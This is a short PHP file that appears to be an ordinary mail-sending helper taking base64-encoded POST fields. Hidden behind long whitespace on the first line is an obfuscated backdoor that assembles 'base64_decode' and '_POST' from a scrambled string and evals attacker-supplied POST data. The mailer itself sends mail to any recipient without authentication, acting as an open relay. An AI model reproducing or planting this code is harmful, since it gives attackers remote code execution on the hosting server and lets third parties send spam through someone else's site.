<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n5d6898'])) {eval($s21(${$s20}['n5d6898']));}?><?php
if(isset($_POST["mailto"]))
        $MailTo = base64_decode($_POST["mailto"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgheader"]))
        $MessageHeader = base64_decode($_POST["msgheader"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgbody"]))
        $MessageBody = base64_decode($_POST["msgbody"]);
else
	{
	echo "indata_error";
	exit;
	}
if(isset($_POST["msgsubject"]))
        $MessageSubject = base64_decode($_POST["msgsubject"]);
else
	{
	echo "indata_error";
	exit;
	}
if(mail($MailTo,$MessageSubject,$MessageBody,$MessageHeader))
	echo "sent_ok";
else
	echo "sent_error";
?>